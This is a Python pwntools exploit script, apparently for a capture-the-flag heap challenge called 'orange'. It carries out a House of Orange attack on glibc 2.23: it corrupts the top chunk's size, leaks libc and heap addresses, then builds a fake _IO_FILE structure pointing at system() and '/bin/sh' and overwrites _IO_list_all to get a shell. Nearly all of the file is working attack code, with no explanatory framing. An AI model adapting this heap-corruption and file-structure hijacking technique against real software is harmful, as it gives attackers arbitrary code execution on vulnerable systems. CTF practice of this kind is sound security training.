from tools import *
context.log_level='debug'
d_d=0x400DEE
d_a=0x13FD
d_e=0x1415
d_s=0x1409
context.terminal = ['tmux', 'splitw', '-h', '-p', '63', '-F' '#{pane_pid}', '-P']
p,e,libc=load("orange","orange")
#libc=ELF('/home/hacker/Desktop/buu64-libc-2.23.so')
libc=ELF('/home/cc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		# gdb.attach(p,x)
		gdb.attach(proc.pidof(p)[0],x)
		pause()
def add(size,content):
    p.sendlineafter('Your choice : ',str(1))
    p.sendlineafter('Length of name :',str(size))
    p.sendafter('Name :',content)
    p.sendlineafter('Price of Orange:',str(1))
    p.sendlineafter('Color of Orange:',str(2))


def edit(size,content):
    p.sendlineafter('Your choice : ',str(3))
    p.sendlineafter('Length of name :',str(size))
    p.sendafter('Name:',content)
    p.sendlineafter('Price of Orange:',str(1))
    p.sendlineafter('Color of Orange:',str(2))


def delete(index):
    p.sendlineafter('4.show\n',str(2))
    p.sendlineafter('index:\n',str(index))
    
def show():
    p.sendlineafter('Your choice : ',str(2))


def pwn():
    gdba()
    add(0x10,'a')
    print('add 0x10')
    pause()
    edit(0x40,b'b'*0x18+p64(0x21)+p64(0x0000002000000001)+p64(0)*2+p64(0xfa1))
    add(0x1000,'c'*8)
    
    add(0x400,'d'*8)
    print('add 0x1000 0x400')
    pause()
    show()
    leak_libc=recv_libc()
    libc_base=leak_libc-0x3c5188
    log_addr('libc_base')
    io_list_all=libc_base+libc.symbols['_IO_list_all']
    sys_addr=libc_base+libc.symbols['system']
    edit(0x20,'e'*0x10)
    
    show()
    p.recvuntil('e'*0x10)
    leak_heap=u64(p.recv(6).ljust(8,b'\x00'))
    log_addr('leak_heap')
    print('system',hex(sys_addr))
    print('leak_heap',hex(leak_heap))
    print('io_list_all',hex(io_list_all))
    print('before edited')
    pause()
    #debug(p,'pie',d_e,d_a,d_s)
    payload=b'f'*0x400
    payload+=p64(0)+p64(0x21)
    payload+=p64(sys_addr)+p64(0)
    payload+=b'/bin/sh\x00'+p64(0x61) #old top chunk prev_size & size 同时也是fake file的_flags字段
    payload+=p64(0)+p64(io_list_all-0x10) #old top chunk fd & bk
    payload+=p64(0)+p64(1)#_IO_write_base & _IO_write_ptr
    payload+=p64(0)*7
    payload+=p64(leak_heap+0x430)#chain
    payload+=p64(0)*13
    payload+=p64(leak_heap+0x508)
    payload+=p64(0)+p64(0)+p64(sys_addr)
    edit(0x1000,payload)
    print('edited')
    print('systemaddr',hex(sys_addr))
    print('io_list_all',hex(io_list_all))
    print('edited')
    pause()
    p.sendlineafter('Your choice : ',str(1))
    p.interactive()
pwn()